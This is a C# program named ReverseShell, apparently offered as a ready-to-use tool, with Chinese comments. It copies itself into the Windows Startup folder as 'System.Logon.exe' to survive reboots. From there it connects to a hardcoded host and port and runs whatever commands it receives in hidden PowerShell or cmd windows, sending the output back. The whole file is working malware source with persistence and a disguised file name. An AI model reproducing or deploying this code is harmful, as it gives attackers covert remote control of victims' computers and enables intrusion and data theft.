using System.Diagnostics;
using System.Net.Sockets;
using System.Text;

namespace ReverseShell
{
    class Program
    {
        static void Main(string[] args)
        {
            var workingPath = AppDomain.CurrentDomain.BaseDirectory[0..^1];
            var startupPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
            if (workingPath.Equals(startupPath))
            {
                ConnectServer();
            }
            else
            {
                SelfReplication(startupPath);
            }
        }

        /// <summary>
        /// 不断的链接服务器往服务器发送接收数据
        /// </summary>
        static void ConnectServer()
        {
            var args = new string[] { "127.0.0.1", "1377", "powershell.exe" };
            if (args.Length < 3)
            {
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("Usage: ReverseShell.exe <ip address> <port> <cmd.exe or powershell.exe>");
                Console.ForegroundColor = ConsoleColor.White;
                Environment.Exit(1);
            }

            string IpAddress = args[0];
            int Port = int.Parse(args[1]);
            string CommandType = args[2];
            string Command;

            if (CommandType != "cmd.exe" && CommandType != "powershell.exe")
            {
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("Usage: ReverseShell.exe <ip address> <port> <cmd.exe or powershell.exe>");
                Console.ForegroundColor = ConsoleColor.White;
                Environment.Exit(1);
            }
            else
            {
                TcpClient client = new(IpAddress, Port);
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("[+] Connected to {0} on port {1}", IpAddress, Port);
                Console.ForegroundColor = ConsoleColor.White;
                try
                {
                    while (true)
                    {
                        NetworkStream stream = client.GetStream();

                        string CommandPrompt = ">>";
                        byte[] SendCommandBuffer = Encoding.Default.GetBytes(CommandPrompt);
                        stream.Write(SendCommandBuffer, 0, SendCommandBuffer.Length);


                        byte[] ReceiveCommandBuffer = new byte[1024];
                        int ResponseData = stream.Read(ReceiveCommandBuffer, 0, ReceiveCommandBuffer.Length);

                        Array.Resize(ref ReceiveCommandBuffer, ResponseData);

                        Command = Encoding.Default.GetString(ReceiveCommandBuffer);

                        if (Command == "exit\n" || Command == "quit\n")
                        {
                            stream.Close();
                            client.Close();
                            break;
                        }

                        Process p = CreateProcess(Command, CommandType == "powershell.exe");

                        string Output = p.StandardOutput.ReadToEnd();
                        string Error = p.StandardError.ReadToEnd();

                        byte[] OutputBuffer = Encoding.UTF8.GetBytes(Output);
                        byte[] ErrorBuffer = Encoding.UTF8.GetBytes(Error);

                        stream.Write(OutputBuffer, 0, OutputBuffer.Length);
                        stream.Write(ErrorBuffer, 0, ErrorBuffer.Length);
                    }
                }
                catch (ArgumentNullException e)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("[!] Error: {0}", e.Message);
                    Console.ForegroundColor = ConsoleColor.White;
                    Environment.Exit(1);
                }
                catch (SocketException e)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("[!] Error: {0}", e.Message);
                    Console.ForegroundColor = ConsoleColor.White;
                    Environment.Exit(1);
                }
                catch (System.IO.IOException e)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("[!] Error: {0}", e.Message);
                    Console.ForegroundColor = ConsoleColor.White;
                    Environment.Exit(1);
                }
            }
        }

        static Process CreateProcess(string command, bool isPowerShell)
        {
            Process process = new();
            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            process.StartInfo.CreateNoWindow = true;
            if (isPowerShell)
            {
                process.StartInfo.FileName = "powershell.exe";
                process.StartInfo.Arguments = "-Command " + command;
            }
            else
            {
                process.StartInfo.FileName = "cmd.exe";
                process.StartInfo.Arguments = "/C " + command;
            }
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.UseShellExecute = false;
            process.Start();
            return process;
        }


        /// <summary>
        /// 把自己复制到指定目录
        /// </summary>
        /// <param name="path"></param>
        static void SelfReplication(string path)
        {
            var self = Process.GetCurrentProcess().MainModule?.FileName!;
            var file = Path.Combine(path, "System.Logon.exe");
            if (!File.Exists(file))
            {
                File.Copy(self, file);
            }
        }
    }
}
